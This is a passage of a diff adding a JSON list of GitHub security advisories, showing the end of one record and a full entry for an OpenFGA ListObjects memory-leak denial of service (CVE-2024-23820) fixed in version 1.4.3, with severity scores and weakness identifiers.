+      "score": 8.8
+    },
+    "epss": {
+      "percentage": 0.04349,
+      "percentile": 0.92259
+    }
+  },
+  {
+    "ghsa_id": "GHSA-rxpw-85vw-fx87",
+    "cve_id": "CVE-2024-23820",
+    "url": "https://api.github.com/advisories/GHSA-rxpw-85vw-fx87",
+    "html_url": "https://github.com/advisories/GHSA-rxpw-85vw-fx87",
+    "summary": "OpenFGA denial of service",
+    "description": "## Overview\nOpenFGA is vulnerable to a DoS attack. In some scenarios that depend on the model and tuples used, a call to ListObjects may not  release memory properly. So when a sufficiently high number of those calls are executed, the OpenFGA server can create an \"out of memory\" error and terminate.\n\n## Fix\nUpgrade to v1.4.3. This upgrade is backwards compatible.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/openfga/openfga/security-advisories/GHSA-rxpw-85vw-fx87",
+    "source_code_location": "https://github.com/openfga/openfga",
+    "identifiers": [
+      {
+        "value": "GHSA-rxpw-85vw-fx87",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-23820",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/openfga/openfga/security/advisories/GHSA-rxpw-85vw-fx87",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-23820",
+      "https://github.com/openfga/openfga/commit/908ac85c8b7769c8042cca31886df8db01976c39",
+      "https://github.com/openfga/openfga/releases/tag/v1.4.3",
+      "https://github.com/advisories/GHSA-rxpw-85vw-fx87"
+    ],
+    "published_at": "2024-01-26T20:12:00Z",
+    "updated_at": "2024-02-01T21:03:38Z",
+    "github_reviewed_at": "2024-01-26T20:12:00Z",
+    "nvd_published_at": "2024-01-26T17:15:13Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/openfga/openfga"
+        },
+        "vulnerable_version_range": "< 1.4.3",
+        "first_patched_version": "1.4.3",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-401",
+        "name": "Missing Release of Memory after Effective Lifetime"
+      },
+      {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      }
+    ],
+    "credits": [],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H",
+      "score": 5.3
+    },
+    "epss": {
+      "percentage": 0.00083,
+      "percentile": 0.37502
+    }
+  }
+]
